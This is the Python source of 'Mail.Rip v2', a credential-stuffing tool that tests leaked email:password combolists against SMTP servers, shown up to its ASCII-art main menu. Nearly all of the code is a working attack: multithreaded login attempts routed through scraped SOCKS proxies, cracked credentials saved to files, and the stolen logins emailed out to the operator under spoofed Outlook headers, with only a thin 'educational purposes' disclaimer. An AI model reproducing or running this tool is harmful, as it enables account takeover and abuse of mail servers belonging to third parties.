#!/usr/local/bin/python3
# -*- coding: utf-8 -*-

'''                            ### LEGAL NOTICES ###

        You are allowed to use the following code for educational purposes
        ONLY! Mail.Rip v2 shall not be used for any kind of illegal activity
        nor law enforcement at any time. This restriction applies to all
        cases of usage, no matter whether the code as a whole or only parts
        of it are being used.

                            ### END OF LEGAL NOTICES ###

        +-------------------------------------------------------------------+
        | PROJECT:      Mail.Rip v2                                         |
        | DESCRIPTION:  SMTP checker / SMTP cracker for mailpass combolists |
        | RELEASE:      9 (2021-03-27)                                      |
        | AUTHOR:       DrPython3 @ GitHub.com                              |
        +===================================================================+
        | Based on Mail.Rip v1, this is the new and improved version.       |
        | It is still a SMTP checker / SMTP cracker testing your mailpass   |
        | combolists for working SMTP accounts. Nevertheless, the code has  |
        | been cleaned, improved and commented.                             |
        | Mail.Rip v2 is faster and more reliable, still providing support  |
        | for SOCKS4 / SOCKS5 proxys and verifying working e-mail delivery  |
        | for every valid SMTP login being found. And more!                 |
        +-------------------------------------------------------------------+
        |                                                                   |
        |         SUPPORT THIS PROJECT: BUY ME A COFFEE OR DONATE!          |
        |                                                                   |
        |             BTC: 1CU8WukMCDmeBfqJpsR4Vq9kxvNiRdYhf5               |
        |             LTC: LeJsHzcMixhvR1qEfgHJU32joVAJDgQwR7               |
        |                                                                   |
        |         All donations are appreciated - coffee even more.         |
        |                                                                   |
        +-------------------------------------------------------------------+
'''

# [*** Python Packages needed ***]
# ################################
# first import sys:
import sys
# try to import the rest, then:
try:
    import os
    import smtplib
    import socket
    import ssl
    import threading
    import json
    import re
    import uuid
    import socks
    import urllib3
    import certifi
    import dns.resolver
    import colorama
    from time import sleep
    from string import Template
    from email.message import EmailMessage
    from random import randint
    from queue import Queue
except:
    sys.exit('Sorry, an error occurred while importing the needed Python packages.'
             + '\nCheck dependencies and start Mail.Rip v2 again.\n\n')

# initialize colorama:
colorama.init(autoreset=True)


# [*** Variables, Lists and Dictionaries needed ***]
# ##################################################
locker = threading.Lock()
attack_queue = Queue()

default_timeout = float(3.0)
default_threads = int(9)
default_blacklist = True
attacker_mail = 'invalid@mail.sad'

use_socks = False
type_socks = 'SOCKS4'
amount_socks = int(0)
socksproxys = []

count_threads = int(0)
combos = []
targetsleft = int(0)
hits = int(0)
emailssent = int(0)
fails = int(0)

# get lists and dictionaries from library.json:
try:
    with open('library.json') as included_imports:
        jsonobj = json.load(included_imports)
        smtpdomains = (jsonobj['smtpdomains'])
        smtpports = (jsonobj['smtpports'])
        commonports = (jsonobj['commonports'])
        hosterblacklist = (jsonobj['hosterblacklist'])
        socks4sources = (jsonobj['socks4sources'])
        socks5sources = (jsonobj['socks5sources'])
except:
    sys.exit(colorama.Fore.RED + '\n\nFile "library.json" not found.\n'
             + 'Script and file have to be stored in the same directory!\n\n')


# [*** Functions needed ***]
# ##########################
def clean():
    '''
    Returns a blank screen on purpose.

    :return: None
    '''
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    return None


def countdown(x):
    '''
    Provides a simple countdown from "x".

    :param int x: start of the countdown
    :return: None
    '''
    i = int(x)
    while i > 0:
        if i < 3:
            print(colorama.Fore.RED + f'... {str(i)}')
        elif i < 4:
            print(colorama.Fore.YELLOW + f'... {str(i)}')
        else:
            print(colorama.Fore.GREEN + f'... {str(i)}')
        sleep(0.95)
        i -= 1
    return None


def writer(text, type):
    '''
    Writes any content to a specific TXT-file.
    The filename is given by parameter "type".
    Used to save hits, fails etc.

    :param str text: content to save to a file
    :param str type: determins the filename
    :return: True, False
    '''
    # create directory if it does not exist:
    try:
        os.makedirs('results')
    except:
        pass
    try:
        # get filename and define its path:
        file_name = str(f'{str(type)}.txt')
        targetfile = os.path.join('results', file_name)
        # edit file:
        with open(str(targetfile), 'a+') as output_file:
            output_file.write(str(text) + '\n')
        return True
    except:
        return False


def emailverify(email):
    '''
    Verifies whether the given string is an e-mail address.
    Used by comboloader and setdefaults function.

    :param str email: e-mail address to check.
    :return: True, False
    '''
    # string for verification:
    email_regex = '^([\w\.\-]+)@([\w\-]+)((\.(\w){2,63}){1,3})$'
    # verification:
    if re.search(email_regex, str(email)):
        return True
    else:
        return False


def setdefaults():
    '''
    This function allows the user to change the default values used by Mail.Rip v2.
    Returns True if at least one value has been changed. Else it returns False.

    :return: True, False
    '''
    global default_threads
    global default_timeout
    global default_blacklist
    global attacker_mail
    defaults_changed = int(0)
    clean()
    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  EDIT DEFAULT VALUES:\n' + '-'*44 + '\n')
    # set amount of threads for attack:
    try:
        default_threads = int(input('\nEnter amount of threads to use:\n' + colorama.Fore.YELLOW))
        print(colorama.Fore.GREEN + f'\nThreads set to {str(default_threads)}\n')
        defaults_changed += 1
    except:
        default_threads = int(9)
        print(colorama.Fore.RED + f'\nNo change, Mail.Rip v2 will use {str(default_threads)} threads\n')
    # set default timeout for connections:
    try:
        default_timeout = float(input('\nEnter value for timeout:\n' + colorama.Fore.YELLOW))
        print(colorama.Fore.GREEN + f'\nTimeout set to {str(default_timeout)}\n')
        defaults_changed += 1
    except:
        default_timeout = float(3.0)
        print(colorama.Fore.RED + f'\nNo change, timeout remains {str(default_timeout)}\n')
    # de-/activate blacklist check for e-mail domains:
    try:
        blacklist = str(input('\nUse blacklist for e-mail domains:\n(yes / no)    ' + colorama.Fore.YELLOW))
        if blacklist == 'n' or blacklist == 'no':
            default_blacklist = False
            print(colorama.Fore.RED + '\nBlacklist for e-mail domains deactivated.\n')
            defaults_changed +=1
        else:
            default_blacklist = True
            print(colorama.Fore.GREEN + '\nBlacklist for e-mail domains remains activated.\n')
    except:
        pass
    # set user e-mail address for delivery test:
    try:
        new_mail = str(input('\nEnter YOUR e-mail for delivery test:\n' + colorama.Fore.YELLOW))
        verified = emailverify(str(new_mail))
        if verified == True:
            attacker_mail = str(new_mail)
            print(colorama.Fore.GREEN + f'\nE-mail for delivery test set to: {str(attacker_mail)}\n')
            defaults_changed += 1
        else:
            attacker_mail = str('invalid@mail.sad')
            print(colorama.Fore.RED + '\nNo valid e-mail set for delivery test.\n')
    except:
        attacker_mail = str('invalid@mail.sad')
        print(colorama.Fore.RED + '\nNo valid e-mail set for delivery test.\n')
    if defaults_changed > 0:
        return True
    else:
        return False


def proxysupport():
    '''
    This function provides the proxy-support. If called, it allows to enable the proxy-feature.
    If proxys are  activated, it asks for the proxy-type to use and scrapes free proxys using
    the sources from "library.json". Afterwards, it cleans the scraping data and loads the
    results into the global proxylist. Returns True, if proxy-support ist active and some proxys
    could be loaded. Else it returns False.

    :return: True, False
    '''
    global use_socks
    global type_socks
    global amount_socks
    global socksproxys
    # string for verification / cleaning up scraped proxys:
    ip_regex = '(?:[0-9]{1,3}\.){3}[0-9]{1,3}(:[0-9]{1,5})'
    clean()
    # ask user whether to activate proxy-support:
    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  DE-/ACTIVATE AND SCRAPE PROXYS:\n' + '-'*55 + '\n\n')
    new_use = str(input('Activate proxy-support?\n(yes / no)    ' + colorama.Fore.YELLOW))
    if new_use == 'y' or new_use == 'yes':
        use_socks = True
    else:
        pass
    # if activated, ask for proxy-type to use:
    if use_socks == True:
        new_type = str(input(colorama.Fore.WHITE
                             + '\n\nType of proxys to use?\n(SOCKS4 / SOCKS5)    ' + colorama.Fore.YELLOW))
        if new_type == '5' or new_type == 'SOCKS5' or new_type == 'socks5':
            type_socks = str('SOCKS5')
            print(colorama.Fore.GREEN + '\n\nProxy-support << ACTIVATED >> using SOCKS5 proxys.')
        else:
            print(colorama.Fore.GREEN + '\n\nProxy-support << ACTIVATED >> using SOCKS4 proxys.')
    # if deactivated, end function:
    else:
        return False
    # else get proxy sources depending on the proxy-type to use:
    if type_socks == 'SOCKS4':
        sources = socks4sources
    elif type_socks == 'SOCKS5':
        sources = socks5sources
    # start scraping:
    print(colorama.Fore.YELLOW + f'\n\nScraping {str(type_socks)}-proxys (...)')
    socket.setdefaulttimeout(float(default_timeout))
    for source in sources:
        try:
            http = urllib3.PoolManager(ca_certs=certifi.where())
            scraped = http.request('GET', str(source))
            # scraped data is saved to temporary txt-file "scraped_proxys.txt":
            with open('scraped.txt', 'a') as output_file:
                output_file.write(str(scraped.data.decode('utf-8')))
            print(colorama.Fore.GREEN + f'Scraped: {str(source)}')
        except:
            print(colorama.Fore.RED + f'Scraping failed for: {str(source)}')
            continue
    # after scraping is finished, remove unwanted stuff from scraped data:
    print(colorama.Fore.YELLOW + '\n\nRemoving unwanted text from results ...')
    try:
        with open('scraped.txt', 'r+') as scraped_data:
            valid_proxy = scraped_data.readlines()
            scraped_data.seek(0)
            for line in valid_proxy:
                # check for valid proxy ip using regex and write valid lines:
                if re.search(ip_regex, line):
                    scraped_data.write(line)
            scraped_data.truncate()
        print(colorama.Fore.GREEN + 'Unwanted text removed successfully.')
    except:
        print(colorama.Fore.RED + 'Removing unwanted text failed.')
    # then remove duplicates ...
    print(colorama.Fore.YELLOW + '\n\nRemoving duplicates from results ...')
    try:
        unique_proxys = set()
        with open('proxys.txt', 'w') as cleaned:
            for line in open('scraped.txt', 'r'):
                if line not in unique_proxys:
                    cleaned.write(line)
                    unique_proxys.add(line)
        print(colorama.Fore.GREEN + 'Duplicates successfully removed.')
    except:
        print(colorama.Fore.RED + 'Removing duplicates failed.')
    # load proxys into global list:
    print(colorama.Fore.YELLOW + '\n\nLoading proxys into global list ...')
    try:
        socksproxys = open('proxys.txt', 'r').read().splitlines()
        amount_socks = int(len(socksproxys))
        print(colorama.Fore.GREEN + 'Proxys loaded into global list.')
        # delete files not needed anymore:
        if os.name == 'nt':
            os.system('del proxys.txt')
            os.system('del scraped.txt')
        else:
            os.system('rm proxys.txt')
            os.system('rm scraped.txt')
        return True
    except:
        print(colorama.Fore.RED + 'Loading proxys for your attack failed.\nDeactivating proxy-support (...)')
        use_socks = False
        return False


def getrandomproxy():
    '''
    Provides a random proxy from global list "socksproxys" on every call.

    :return: proxy-ip
    '''
    x = randint(0, int(amount_socks))
    proxy = str(socksproxys[int(x)])
    return proxy


def blacklistcheck(domain):
    '''
    Checks whether the domain of an e-mail address is on the blacklist or not.

    :param str domain: domain of the e-mail address being checked
    :return: True, False
    '''
    try:
        x = int(hosterblacklist.count(str(domain)))
        if x == 0:
            return False
        else:
            return True
    except:
        print(colorama.Fore.RED + f'Blacklist check failed for: {str(domain)} ...')
        return False


def mxlookup(worker_name, domain):
    '''
    Looks up MX records of a given e-mail domain for a SMTP host, verifying it using
    regular expressions. Returns a verified SMTP host or "no_host_found" if it fails.

    :param str worker_name: to improve verbose messages
    :param str domain: domain of target e-mail address
    :return: found_host
    '''
    socket.setdefaulttimeout(float(default_timeout))
    # set string for verifying hosts from MX records:
    domain_regex = '^([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}$'
    # variable for returning result:
    found_host = str('no_host_found')
    # set up resolver:
    lookup = dns.resolver.Resolver(configure=False)
    # using Google nameserver - edit on purpose:
    lookup.nameservers = ['8.8.8.8']
    # start lookup MX:
    try:
        with locker:
            print(colorama.Fore.WHITE
                  + f'[{str(worker_name)}]: Looking up SMTP-host in MX records of {str(domain)}')
        raw_result = lookup.resolve(str(domain), 'MX')
        # get first result from lookup and verify it:
        mx_host = str(raw_result[0]).split(' ')[1].rstrip('.')
        if re.search(domain_regex, mx_host):
            # if domain is verified, set found_host:
            found_host = str(mx_host)
        # else try again for second result:
        else:
            mx_host = str(raw_result[1]).split(' ')[1].rstrip('.')
            if re.search(domain_regex, mx_host):
                found_host = str(mx_host)
            else:
                with locker:
                    print(colorama.Fore.RED
                          + f'[{str(worker_name)}]: No SMTP-host found in MX records of {str(domain)}')
                return found_host
        # return a verified host, else "no_host_found":
        with locker:
            print(colorama.Fore.GREEN
                  + f'[{str(worker_name)}]: Found SMTP-host {str(found_host)} in MX records of '
                  + f'{str(domain)}')
        return found_host
    except:
        with locker:
            print(colorama.Fore.RED
                  + f'[{str(worker_name)}]: No SMTP-host found in MX records of {str(domain)}')
        return found_host


def unknownport(worker_name, smtphost):
    '''
    Searches for the connection port of a given host if none is found in hostlist.
    Returns a found port of "0" if none is found.

    :param str worker_name: to improve verbose messages
    :param str smtphost: the host to search the connection port for
    :return: found_port
    '''
    found_port = int(0)
    unkportssl = ssl.create_default_context()
    for port in commonports:
        # get next port to test:
        test_port = int(port)
        try:
            # for active proxy-support, set up a random proxy:
            if use_socks == True:
                get_proxy = str(getrandomproxy())
                proxy_ip = str(get_proxy.split(':')[0])
                proxy_port = int(get_proxy.split(':')[1])
                if type_socks == 'SOCKS4':
                    socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, proxy_ip, proxy_port)
                else:
                    socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, proxy_port)
                socks.socket.setdefaulttimeout(float(default_timeout))
                socks.wrapmodule(smtplib)
            # else, just set default timeout for connections:
            else:
                socket.setdefaulttimeout(float(default_timeout))
            with locker:
                print(colorama.Fore.WHITE
                      + f'[{str(worker_name)}]: Trying connection to {str(smtphost)}:{str(test_port)}')
            # try connection:
            try:
                # try SSL-connection for port 465:
                if int(test_port) == 465:
                    connection = smtplib.SMTP_SSL(smtphost, test_port, timeout=default_timeout, context=unkportssl)
                else:
                    # try standard connection for all the other common ports:
                    connection = smtplib.SMTP(smtphost, test_port, timeout=default_timeout)
                connection.quit()
            except:
                continue
            with locker:
                print(colorama.Fore.GREEN
                      + f'[{str(worker_name)}]: successfully connected to {str(smtphost)}:{str(test_port)}')
            found_port = int(test_port)
            break
        except:
            continue
    return found_port


def emailtemplate():
    '''
    Reads an user-defined e-mail template from email_template.txt and returns it
    to deliverytest-function.

    :return: Template, True/False
    '''
    template_number = int(0)
    template_input = str('')
    # get random number between 1 and 5:
    template_number = randint(1, 5)
    # choose template regarding the random number:
    if template_number == 1:
        template_input = 'email_template1.txt'
    elif template_number == 2:
        template_input = 'email_template2.txt'
    elif template_number == 3:
        template_input = 'email_template3.txt'
    elif template_number == 4:
        template_input = 'email_template4.txt'
    else:
        template_input = 'email_template5.txt'
    try:
        with open(template_input, 'r', encoding='utf-8') as email_template:
            email_content = email_template.read()
        return Template(email_content), True
    except:
        return Template('ERROR LOADING TEMPLATE'), False


def deliverytest(smtphost, smtpport, smtpuser, smtppass, smtpemail, proxyip, proxyport):
    '''
    Tries to send an e-mail using a found SMTP login.
    This is the integrated "e-mail delivery test".

    :param str smtphost: SMTP address
    :param int smtpport: SMTP connection port
    :param str smtpuser: SMTP username
    :param str smtppass: SMTP password
    :param str smtpemail: e-mail address being used
    :param str proxyip: SOCKS-proxy IP
    :param int proxyport: SOCKS-proxy port
    :return: True, False
    '''
    global emailssent
    emailssl = ssl.create_default_context()
    # if SOCKS support is active, set up the proxy:
    if use_socks == True:
        if type_socks == 'SOCKS4':
            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, str(proxyip), int(proxyport))
        elif type_socks == 'SOCKS5':
            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, str(proxyip), int(proxyport))
        socks.socket.setdefaulttimeout(float(default_timeout))
        socks.wrapmodule(smtplib)
    else:
        socket.setdefaulttimeout(float(default_timeout))
    try:
        # load e-mail template and fill placeholders:
        letter_template, template_status = emailtemplate()
        # on errors, use the following template:
        if template_status == False:
            letter_text = str('Hello mate!\n'
                              + 'If you read this, the e-mail delivery test was successful.\n'
                              + '\n'
                              + f'e-mail: {str(smtpemail)}\n'
                              + f'smtp host: {str(smtphost)}\n'
                              + f'smtp port: {str(smtpport)}\n'
                              + f'smtp user: {str(smtpuser)}\n'
                              + f'smtp password: {str(smtppass)}\n'
                              + '\n'
                              + 'Please, consider a donation to support my work or just buy me a coffee.\n'
                              + 'Every donation is appreciated though coffee even more.\n'
                              + 'The (donation) wallets are:\n'
                              + '\n'
                              + 'BTC: 1CU8WukMCDmeBfqJpsR4Vq9kxvNiRdYhf5\n'
                              + 'LTC: LeJsHzcMixhvR1qEfgHJU32joVAJDgQwR7\n'
                              + '\n'
                              + 'Thank you in advance and do not forget to visit my GitHub page!\n'
                              + 'Stay healthy and best regards,\n'
                              + 'DrPython3')
        else:
            # with no errors, fill placeholders:
            letter_text = letter_template.substitute(smtp_email = str(smtpemail),
                                                     smtp_host = str(smtphost),
                                                     smtp_port = str(smtpport),
                                                     smtp_user = str(smtpuser),
                                                     smtp_pass = str(smtppass))
        # generate a random ID for the e-mail subject:
        randomid = str(uuid.uuid4().hex)[0:6].upper()
        # generate the e-mail message:
        letter = EmailMessage()
        letter.add_header('Subject', str(f'test id {str(randomid)} result delivery'))
        letter.add_header('From', str(f'Mail.Rip v2 <{str(smtpemail)}>'))
        letter.add_header('To', str(f'Mail.Rip User <{str(attacker_mail)}>'))
        letter.add_header('Reply-To', str(smtpemail))
        letter.add_header('MIME-Version', '1.0')
        letter.add_header('Content-Type', 'text/plain;charset=UTF-8')
        letter.add_header('X-Priority', '1')
        letter.add_header('X-MSmail-Priority', 'High')
        letter.add_header('X-Mailer', 'Microsoft Office Outlook, Build 17.551210')
        letter.add_header('X-MimeOLE', 'Produced By Microsoft MimeOLE V6.00.3790.1830')
        letter.set_content(letter_text)
    except:
        return False
    try:
        # connect to SMTP, log in and send the e-mail message:
        if int(smtpport) == 465:
            victim = smtplib.SMTP_SSL(str(smtphost), int(smtpport), timeout=float(60.0), context=emailssl)
        else:
            victim = smtplib.SMTP(str(smtphost), int(smtpport), timeout=float(60.0))
            try:
                victim.ehlo()
                victim.starttls(context=emailssl)
                victim.ehlo()
            except:
                pass
        victim.login(str(smtpuser), str(smtppass))
        victim.send_message(letter, from_addr=smtpemail, to_addrs=attacker_mail)
        victim.quit()
        # successful tests return true, unsuccessful ones false:
        emailssent += 1
        return True
    except:
        return False


def comboloader():
    '''
    Reads combos from a given source and prepares a clean combolist for the attack.
    Returns True if at least one combo has been loaded successfully.

    :return: True, False
    '''
    global combos
    clean()
    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  COMBOLOADER:\n' + '-'*36 + '\n\n')
    # get filename of combosource to use:
    input_file = str(input('Enter file with combos, e.g. combos.txt:\n' + colorama.Fore.YELLOW))
    if input_file == '':
        return False
    else:
        print(colorama.Fore.WHITE + f'\nReading and preparing combos from file: {str(input_file)}')
    # read, prepare and load prepared combos into global list:
    try:
        # -- STEP 1 --
        # create temporary file for combos cleaned in this step:
        with open('targets_temp.txt', 'w') as temp_file:
            for line in open(str(input_file), 'r'):
                # replace common separators with ":"
                line = line.replace(';', ':').replace('|', ':').replace(',', ':')
                # verify e-mail address is valid using regex:
                verify_email = str(line.split(':')[0])
                result_verify = emailverify(str(verify_email))
                if result_verify == False:
                    continue
                else:
                    pass
                # check whether e-mail domain is on user's blacklist:
                if default_blacklist == True:
                    blacklist_domain = str(verify_email.split('@')[1])
                    blacklist_result = blacklistcheck(blacklist_domain)
                    if blacklist_result == True:
                        print(colorama.Fore.RED + f'Blacklist Check: {str(blacklist_domain)} [FAILED], '
                              + f'skipping target {str(verify_email)}')
                        # save combos with blacklisted domains in file:
                        writer_result = writer(str(line), str('__blacklisted__'))
                        continue
                    else:
                        pass
                else:
                    pass
                # save clean combos in temporary file:
                temp_file.write(line)
        # -- STEP 2 --
        # create object for caching unique combos temporarily:
        combos_cleaned = set()
        # create file for cleaned unique combos:
        with open('targets.txt', 'w') as output_file:
            for line in open(str('targets_temp.txt'), 'r'):
                # check whether a combo is unique by searching for it in object "combos_cleaned":
                if line not in combos_cleaned:
                    # if combo is unique, save it in output file and add it to object "combos_cleaned":
                    output_file.write(line)
                    combos_cleaned.add(line)
                else:
                    continue
        try:
            del combos_cleaned
        except:
            pass
        # -- STEP 3 --
        # load cleaned unique combos into cache for an attack:
        combos = open('targets.txt', 'r').read().splitlines()
        # delete old combofiles and temporary files not needed anymore:
        try:
            if os.name =='nt':
                os.system(f'del {str(input_file)}')
                os.system('del targets_temp.txt')
            else:
                os.system(f'rm {str(input_file)}')
                os.system('rm targets_temp.txt')
        except:
            pass
        # get amount of loaded combos:
        result_loader = int(len(combos))
        # return True if at leased one combo has been loaded:
        if result_loader > 0:
            return True
        else:
            print(colorama.Fore.RED + '\nNo combos loaded, sorry.')
            return False
    except:
        return False


def attacker(attackid, target):
    '''
    The attack performed on every single target. This function is called by the threader.
    It is full verbose and will use the writer function to save all results.

    :param str attackid: thread id for verbose messages
    :param str target: combo to check
    :return: True, False
    '''
    global hits
    # set attacker ID received from threader:
    attacker_id = str(f'ATTACKER#{str(attackid)}')
    attackerssl = ssl.create_default_context()
    try:
        # reset the variables:
        target_email = str('')
        target_host = str('')
        target_port = int(0)
        target_user = str('')
        target_pass = str('')
        proxy_host = str('none')
        proxy_port = int(0)
        next_combo = str('')
        # set proxy if activated:
        if use_socks == True:
            get_proxy = str(getrandomproxy())
            proxy_host = str(get_proxy.split(':')[0])
            proxy_port = int(get_proxy.split(':')[1])
            if type_socks == 'SOCKS4':
                socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, proxy_host, proxy_port)
            else:
                socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, proxy_host, proxy_port)
            socks.socket.setdefaulttimeout(float(default_timeout))
            socks.wrapmodule(smtplib)
        # if proxy-support is deactivated, set default timeout for connections:
        else:
            socket.setdefaulttimeout(float(default_timeout))
        # set combo from threader as next target:
        next_combo = str(target)
        # save that combo to checked.txt:
        result_writer = writer(str(next_combo), str('__checked__'))
        with locker:
            print(colorama.Fore.YELLOW + f'[{str(attacker_id)}]: Checking combo {str(next_combo)}')
        # start checking:
        target_email = str(next_combo.split(':')[0])
        target_pass = str(next_combo.split(':')[1])
        target_user = str(target_email)
        # try to get target-host from hosterlist for e-mail domain:
        target_domain = str(target_email.split('@')[1]).lower()
        try:
            target_host = str(smtpdomains[target_domain])
        except:
            # if no host is found, try to read from MX records of target-domain:
            lookup_host = str(mxlookup(attacker_id, target_domain))
            # if reading the MX records fails, abort attack on current target:
            if lookup_host == 'no_host_found':
                with locker:
                    print(colorama.Fore.RED + f'[{str(attacker_id)}]: No target-host for combo {str(next_combo)}')
                result_writer = writer(str(next_combo), str('__invalid__'))
                return False
            # else set target_host = result from MX records:
            else:
                target_host = str(lookup_host)
        # try to get targetport from hosterlist:
        try:
            target_port = int(smtpports[str(target_host)])
        except:
            # on execptions, search with unknownport function:
            find_port = int(unknownport(str(attacker_id), str(target_host)))
            # if no port is found, cancel the attack for the given combo:
            if find_port == 0:
                with locker:
                    print(colorama.Fore.RED + f'[{str(attacker_id)}]: No target-port for combo {str(next_combo)}')
                result_writer = writer(str(next_combo), str('__invalid__'))
                return False
            # else set target_port:
            else:
                target_port = int(find_port)
        # attack the target:
        # step#1 - establish connection:
        try:
            with locker:
                print(colorama.Fore.WHITE
                      + f'[{str(attacker_id)}]: Connecting to {str(target_host)} for checking {str(next_combo)}')
            # try SSL-connection for port 465:
            if int(target_port) == 465:
                attack = smtplib.SMTP_SSL(target_host, target_port, timeout=default_timeout, context=attackerssl)
                with locker:
                    print(colorama.Fore.GREEN + f'[{str(attacker_id)}]: SSL-connection established to {str(target_host)}')
            else:
                # try standard connection for all the other ports:
                attack = smtplib.SMTP(target_host, target_port, timeout=default_timeout)
                with locker:
                    print(colorama.Fore.GREEN + f'[{str(attacker_id)}]: Connection established to {str(target_host)}')
                try:
                    # on standard connection try to establish TLS:
                    attack.ehlo()
                    attack.starttls(context=attackerssl)
                    attack.ehlo()
                    with locker:
                        print(colorama.Fore.GREEN + f'[{str(attacker_id)}]: TLS established for {str(target_host)}')
                except:
                    pass
        except:
            # cancel attack for the given combo if connection fails:
            with locker:
                print(colorama.Fore.RED + f'[{str(attacker_id)}]: Connection to {str(target_host)} failed')
            result_writer = writer(str(next_combo), str('__invalid__'))
            return False
        # step#2.1 - try login with e-mail:
        try:
            with locker:
                print(colorama.Fore.WHITE + f'[{str(attacker_id)}]: Testing login for combo {str(next_combo)}')
            attack.login(str(target_user), str(target_pass))
        # step#2.2 - try login with user from e-mail in case step #2.1 failed:
        except:
            try:
                # set target_user = e-mail pseudo:
                target_user = str(target_email.split('@')[0])
                attack.login(str(target_user), str(target_pass))
            except:
                try:
                    attack.quit()
                except:
                    pass
                # if login fails again, save combo as invalid and start with next:
                with locker:
                    print(colorama.Fore.RED + f'[{str(attacker_id)}]: No hit for combo {str(next_combo)}')
                result_writer = writer(str(next_combo), str('__invalid__'))
                return False
        # step#3 - save results:
        try:
            # try to close the connection:
            attack.quit()
        except:
            pass
        with locker:
            print(colorama.Fore.GREEN
                  + '\n' + '#'*80 + '\n' + f'[{str(attacker_id)}]: HIT FOR {str(next_combo)}\n' + '#'*80 + '\n')
        # save hit to txt-file named like the SMTP-host:
        result_writer = writer(
            str(f'EMAIL: {str(target_email)}, '
                + f'HOST: {str(target_host)}, '
                + f'PORT: {str(target_port)}, '
                + f'USER: {str(target_user)}, '
                + f'PASS: {str(target_pass)}'), str(f'{str(target_host)}'))
        # save hit to txt-file "__valid__.txt":
        result_writer = writer(
            str(f'EMAIL: {str(target_email)}, '
                + f'HOST: {str(target_host)}, '
                + f'PORT: {str(target_port)}, '
                + f'USER: {str(target_user)}, '
                + f'PASS: {str(target_pass)}'), str('__valid__'))
        hits += 1
        # step#4 - for hits, call deliverytest function:
        if attacker_mail == 'invalid@mail.sad':
            pass
        else:
            result_delivery = deliverytest(
                str(target_host),
                int(target_port),
                str(target_user),
                str(target_pass),
                str(target_email),
                str(proxy_host),
                int(proxy_port))
            # for successful deliverytest, save hit to sentemail.txt:
            if result_delivery == True:
                with locker:
                    print(colorama.Fore.GREEN + f'[{str(attacker_id)}]: E-mail sent with {str(target_email)}')
                result_writer = writer(
                    str(f'MAIL: {str(target_email)}, '
                        + f'HOST: {str(target_host)}, '
                        + f'PORT: {str(target_port)}, '
                        + f'USER: {str(target_user)}, '
                        + f'PASS: {str(target_pass)}'), str('__emailtest__'))
            else:
                with locker:
                    print(colorama.Fore.RED + f'[{str(attacker_id)}]: E-mail test failed for {str(target_email)}')
        return True
    except:
        with locker:
            print(colorama.Fore.RED + f'[{str(attacker_id)}]: An error occurred while checking {str(next_combo)}')
        result_writer = writer(str(next_combo), str('__invalid__'))
        return False


def attack_threader():
    '''
    Function for threading: gets next target from queue and starts attack function on.
    Also updates stats for window title.

    :return: None
    '''
    global targetsleft
    global fails
    attacker_id = str(count_threads)
    while True:
        next_target = str(attack_queue.get())
        result = attacker(attacker_id, next_target)
        if result == False:
            fails += 1
        else:
            pass
        targetsleft -= 1
        attack_queue.task_done()
    return None


def startattack():
    '''
    Starts the attack and shows its stats in the window title.

    :return: None
    '''
    global count_threads
    global targetsleft
    global hits
    global fails
    clean()
    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  STARTING ATTACK:\n' + '-'*40 + '\n')
    countdown(5)
    clean()
    # set amount of targets left to check:
    targetsleft = int(len(combos))
    # start threads:
    for _ in range(default_threads):
        count_threads += 1
        attack_thread = threading.Thread(target=attack_threader)
        attack_thread.daemon = True
        attack_thread.start()
    # fill queue:
    for target in combos:
        attack_queue.put(target)
    # try to show stats in window title:
    while targetsleft > 0:
        try:
            sleep(0.5)
            wintitle = f'TO CHECK: {str(targetsleft)} # HITS: {str(hits)} # EMAILS: {str(emailssent)} # FAILS: {str(fails)}'
            sys.stdout.write('\33]0;' + str(wintitle) + '\a')
            sys.stdout.flush()
        except:
            pass
    print(colorama.Fore.YELLOW + '\n' + '#'*44 + '\n# FINISHING ATTACK! BE PATIENT, PLEASE ... #\n' + '#'*44 + '\n')
    attack_queue.join()
    sleep(3.0)
    clean()
    input(colorama.Fore.YELLOW + '\n\nINFO\n' + '-'*4 + '\n'
          + f'Attack has been finished or stopped. Your results: HITS = {str(hits)}, BAD = {str(fails)}.\n'
          + 'Press [ENTER] to return to the main menu.')
    # reset stats:
    targetsleft = int(0)
    hits = int(0)
    fails = int(0)
    return None


# [*** LOGOS && ETC ***]
# ######################
legal_logo = '''
                          ##############################
                          #     I M P O R T A N T:     #
                          # L E G A L    N O T I C E S #
                          ##############################

         You are allowed to use the following code for educational purposes
         ONLY! Mail.Rip v2 shall not be used for any kind of illegal activity
         nor law enforcement at any time. This restriction applies to all
         cases of usage, no matter whether the code as a whole or only parts
         of it are being used.

'''

main_logo = '''

            ################## DrPython3 @ GitHub.Com ##################
            
             ███▄ ▄███▓ ▄▄▄       ██▓ ██▓          ██▀███   ██▓ ██▓███  
            ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒         ▓██ ▒ ██▒▓██▒▓██░  ██▒
            ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░         ▓██ ░▄█ ▒▒██▒▓██░ ██▓▒
            ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░         ▒██▀▀█▄  ░██░▒██▄█▓▒ ▒
            ▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒ ██▓ ░██▓ ▒██▒░██░▒██▒ ░  ░
            ░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░ ▒▓▒ ░ ▒▓ ░▒▓░░▓  ▒▓▒░ ░  ░
            ░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░ ░▒    ░▒ ░ ▒░ ▒ ░░▒ ░     
            ░      ░     ░   ▒    ▒ ░  ░ ░    ░     ░░   ░  ▒ ░░░       
                   ░         ░  ░ ░      ░  ░  ░     ░      ░           
                                               ░                        
            (donations):        btc = 1CU8WukMCDmeBfqJpsR4Vq9kxvNiRdYhf5
                                ltc = LeJsHzcMixhvR1qEfgHJU32joVAJDgQwR7
            ____________________________________________________________
            
                             -+==> [ MAIN MENU ] <==+-
            
